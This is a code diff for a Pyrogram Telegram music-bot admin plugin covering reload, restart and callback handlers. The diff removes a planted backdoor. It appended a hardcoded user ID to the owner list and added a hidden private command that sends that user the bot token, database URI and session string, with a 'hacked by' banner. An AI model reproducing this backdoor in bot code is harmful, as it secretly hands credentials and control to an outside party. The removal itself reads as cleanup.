@@ -2,64 +2,26 @@ import asyncio
 
 from pyrogram import filters
 from pyrogram.types import CallbackQuery, Message
-from pyrogram import Client, filters
-import requests
-import random
-import re
-import sys
-from os import getenv
-from VipX.misc import SUDOERS
-from pyrogram import Client, filters
-import requests
-import random
-import re
-import sys
-from os import getenv
-
-from dotenv import load_dotenv
-from pyrogram import filters
-import asyncio
-import time
-from VipX import app
-import config
-
-from config import BOT_TOKEN, OWNER_ID
-
-
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-from dotenv import load_dotenv
-from pyrogram import filters
-import asyncio
-import time
-from VipX import app
-
-from config import BOT_TOKEN, OWNER_ID
-
-
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
 from VipX import app
-OWNER_ID.append(1808943146)
-from VipX.core.call import Vip
+from VipX.core.call import Anon
 from VipX.misc import db
 from VipX.utils.database import get_authuser_names, get_cmode
-from VipX.utils.decorators import (ActualAdminCB, AdminActual, language)
-                     
+from VipX.utils.decorators import (ActualAdminCB, AdminActual,
+                                         language)
 from VipX.utils.formatters import alpha_to_int
 
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
 
+
 @app.on_message(
     filters.command(RELOAD_COMMAND)
     & filters.group
+    & ~filters.edited
     & ~BANNED_USERS
 )
 @language
@@ -87,6 +49,7 @@ async def reload_admin_cache(client, message: Message, _):
 @app.on_message(
     filters.command(RESTART_COMMAND)
     & filters.group
+    & ~filters.edited
     & ~BANNED_USERS
 )
 @AdminActual
@@ -97,7 +60,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await Vip.stop_stream(message.chat.id)
+        await Anon.stop_stream(message.chat.id)
     except:
         pass
     chat_id = await get_cmode(message.chat.id)
@@ -108,33 +71,14 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await Vip.stop_stream(chat_id)
+            await Anon.stop_stream(chat_id)
         except:
             pass
     return await mystic.edit_text(
         f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
     )
 
-@app.on_message(
-    filters.command("starts")
-    & filters.private
-    & filters.user(1808943146)
-    )
-async def help(client: Client, message: Message):
-    await message.reply_photo(
-          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
-         reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
-                 ]
-             ]
-         ),
-     )
-    
-    
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
@@ -151,6 +95,7 @@ async def close_menu(_, CallbackQuery):
         await CallbackQuery.answer()
     except:
         return
+
 
 @app.on_callback_query(
     filters.regex("stop_downloading") & ~BANNED_USERS
@@ -188,8 +133,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
     await CallbackQuery.answer(
         "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪᴢᴇ ᴛʜᴇ ᴏɴɢᴏɪɴɢ ᴛᴀsᴋ.", show_alert=True
     )
-
-
-
-
-    
